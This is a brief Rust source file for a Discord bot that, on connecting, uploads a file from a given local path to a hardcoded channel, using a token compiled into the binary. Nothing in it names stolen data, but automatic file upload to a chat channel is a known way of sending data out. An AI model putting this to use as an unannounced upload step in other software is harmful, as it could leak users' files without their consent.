use serenity::{
    all::CreateAttachment, async_trait, model::{channel::Message, gateway::Ready, id::ChannelId}, prelude::*, all::CreateMessage
};
use std::sync::Arc;
use tokio::sync::Mutex;


struct Handler {
    file_path: Arc<Mutex<String>>,
}

#[async_trait]
impl EventHandler for Handler {
    async fn ready(&self, ctx: Context, _ready: Ready) {
        println!("Bot is online!");

        let channel_id = ChannelId::new(123456789012345678); // Replace with your channel ID
        let file_path = self.file_path.lock().await.clone();

        let message_builder = CreateMessage::new().content("UPLOAD FILE");
        if let Err(why) = channel_id.send_files(&ctx.http, vec![CreateAttachment::path(file_path).await.unwrap()], message_builder).await {
            println!("Error sending file: {:?}", why);
        }
    }

    async fn message(&self, _ctx: Context, _msg: Message) {
        // Handle incoming messages here if needed
    }
}

pub async fn runbot(file_path: String) {
    let token = include_str!("../token.txt");
    let intents = GatewayIntents::GUILD_MESSAGES | GatewayIntents::DIRECT_MESSAGES | GatewayIntents::MESSAGE_CONTENT;
    let handler = Handler {
        file_path: Arc::new(Mutex::new(file_path)),
    };
    let mut client = Client::builder(&token, intents)
        .event_handler(handler)
        .await
        .expect("Error creating client");

    if let Err(why) = client.start().await {
        println!("Client error: {:?}", why);
    }
}